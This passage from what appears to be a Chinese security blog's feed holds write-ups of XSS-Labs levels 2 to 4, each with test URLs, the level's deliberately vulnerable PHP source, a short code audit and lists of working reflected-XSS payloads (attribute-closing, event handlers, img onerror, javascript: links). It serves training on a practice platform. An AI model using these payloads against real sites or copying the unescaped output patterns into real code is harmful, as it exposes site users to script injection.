class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level4.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str3.<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>搜索</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level4.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由20行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17-19、22行代码可知：程序将通过<strong>GET方法</strong>得到的参数做尖括号过滤后赋值给<code>name=keyword</code>的<code>input</code>标签的<code>value</code>值。</li></ul></li><li><p>所以基于标签的注入无效，但基于事件(不含<code>&lt;&gt;</code>)的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序对参数中的尖括号进行过滤后回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># 构造事件，闭合引号<span class="token string">"+onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span># 构造事件，闭合引号<span class="token string">"+onmouseover="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span># 构造事件# <span class="token comment" spellcheck="true">//的作用：因为参数是由双引号包裹，所以需要事件参数与双引号保持一定的距离，因此使用+也可以达到相同的效果</span>"<span class="token operator">+</span>onclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span>"<span class="token operator">+</span>onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li><li><a href="https://www.cnblogs.com/hookjoy/p/4109682.html" target="_blank" rel="noopener">32个触发事件XSS语句的总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level3</title>
      <link href="/2020/10/26/xss-zhi-xss-labs-level3/"/>
      <url>/2020/10/26/xss-zhi-xss-labs-level3/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该网页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level3/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level3<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level3/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>标签和<code>name=keyword</code>的<code>input</code>标签中参数的<code>尖括号</code>进行了转义，而未对事件进行过滤，推测可有可能是使用<code>htmlspecialchars()</code>方法对，构造触发事件就可以正常弹窗，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level3<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token string">'+onclick='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level3/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level4.php?keyword=try harder!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level3<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level3<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level3.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>搜索</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level3.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由18行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17、20行代码可知：程序将通过<strong>GET方法</strong>得到的参数经过<code>htmlspecialchars()</code>函数转义后赋值给<code>name=keyword</code>的<code>input</code>标签的<code>value</code>值。</li></ul></li><li><p>所以基于脚本的注入无效，但基于事件的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序对参数使用了<code>htmlspecialchars()</code>函数进行转义后回显到HTML页面中，所以此关的主要为基于事件的payload：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">'+onmouseover='</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'+onclick='</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'+onclick='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>'<span class="token operator">+</span>onclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span class="token string">'+onfocus='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li><li><a href="https://www.cnblogs.com/hookjoy/p/4109682.html" target="_blank" rel="noopener">32个触发事件XSS语句的总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level2</title>
      <link href="/2020/10/25/xss-zhi-xss-labs-level2/"/>
      <url>/2020/10/25/xss-zhi-xss-labs-level2/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该网页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level2/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level2<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level2/注入点检测结果.png" alt="注入点检测结果"></center><p>由上述操作可以推断，程序对<code>h2</code>标签的参数进行了转义，而对<code>name=keyword</code>的<code>input</code>标签中的参数未进行转义，闭合value值和input标签就可以正常弹窗，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 闭合标签+payload+注释</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level2<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token comment" spellcheck="true">//</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level2/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level3.php?writing=wait"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level2<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level2<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level2.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str.<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>搜索<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level2.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由18行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17、20行代码可知：程序将通过<strong>GET方法</strong>得到的参数未经任何转义或过滤直接赋值给<code>name=keyword</code>的<code>input</code>标签的<code>value</code>值。</li></ul></li><li><p>所以闭合标签或构造事件后可以成功调用<code>alert()</code>方法的脚本都可以做为payload。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># 构造事件<span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span># 闭合原有标签，构造脚本"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token comment" spellcheck="true">//</span># 闭合原有标签，构造事件"<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token comment" spellcheck="true">//</span># 闭合原有标签，构造伪协议<span class="token string">">&lt;a href="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"<span class="token operator">></span>a<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level1</title>
      <link href="/2020/10/25/xss-zhi-xss-labs-level1/"/>
      <url>/2020/10/25/xss-zhi-xss-labs-level1/</url>
      
